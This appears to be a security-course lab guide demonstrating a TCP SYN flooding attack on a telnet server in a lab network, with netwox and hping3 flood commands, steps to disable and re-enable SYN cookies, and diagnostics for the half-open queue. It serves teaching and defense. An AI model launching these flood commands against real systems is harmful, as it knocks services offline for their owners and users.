## TCP Syn Flooding Attack Demo

Steps:

1. Attacker: Install netwox on the attacker machine:

```console
$ sudo apt install netwox
```

2. Attacker: Save these lines in a bash script named syn_flood.sh:

```console
for i in {1..10000}; do
  sudo netwox 76 -i 10.0.2.4 -p 23 -s raw
done
```

**Note**: change 10.0.2.4 to the victim server's IP address.

3. Attacker: launch attack:

```console
$ bash syn_flood.sh
```

4. Victim server: disable syn cookie defense:

```console
$ sudo sysctl -w net.ipv4.tcp_syncookies=0
```

5. Victim client: connects to victim server via telent:

```console
$ telent 10.0.2.4
```

If the attack is successful, client will only see this:

```
$ telnet 10.0.2.4
Trying 10.0.2.4...
```

But the connection won't actually be established.

6. Either we stop the attack command, or we enable the syn cookie defense mechanism on the victim server. To stop the attack command, just press control-c on the attacker's terminal console; to enable the syn cookie defense mechanism on the victim server, we run this command on the server side:

```console
$ sudo sysctl -w net.ipv4.tcp_syncookies=1
```

## Diagnose

### If the attack is not successful, one possible reason is TCP cache

A kernel mitigation mechanism. On Ubuntu 20.04, if machine X has never made a TCP connection to the victim machine, when the SYN flooding attack is launched, machine X will not be able to telnet into the victim machine. However, if before the attack, machine X has already made a telnet (or TCP connection) to the victim machine, then X seems to be “immune” to the SYN flooding attack, and can successfully telnet to the victim machine during the attack. It seems that the victim machine remembers past successful connections in its cache, and uses this cache when establishing future connections with the “returning” client. This behavior does not exist in Ubuntu 16.04 and earlier versions.

To view the cache, run this command:

```console
$ ip tcp_metrics show
```

To clear the cache, run this command:

```console
$ ip tcp_metrics flush
```

### Attack still doesn't work?

The SEED labs instructions explains a few other possibilities. See the instructions [here](https://seedsecuritylabs.org/Labs_20.04/Files/TCP_Attacks/TCP_Attacks.pdf).

## Other Useful Commands

1. We can also use this other command to perform a TCP syn flooding attack:

```console
$ sudo hping3 -S -p 23 --flood 10.0.2.4
```

2. To view the half-open connection queue:

```console
$ watch -n 1 "ss -lnt state syn-recv"
```

When the attack is ongoing, this above command should generate out like this:

Every 1.0s: ss -lnt state syn-recv

Recv-Q   Send-Q      Local Address:Port          Peer Address:Port    Process
0        0                10.0.2.4:23          248.145.67.125:3246
0        0                10.0.2.4:23         242.179.218.138:62443
0        0                10.0.2.4:23           249.186.80.68:3355
0        0                10.0.2.4:23         242.237.226.140:55036
0        0                10.0.2.4:23             244.82.7.83:8719
0        0                10.0.2.4:23          249.166.106.74:21504
0        0                10.0.2.4:23         241.181.105.121:22277
0        0                10.0.2.4:23          250.77.236.102:34280
0        0                10.0.2.4:23           253.68.21.228:20031
0        0                10.0.2.4:23            243.1.104.21:5201
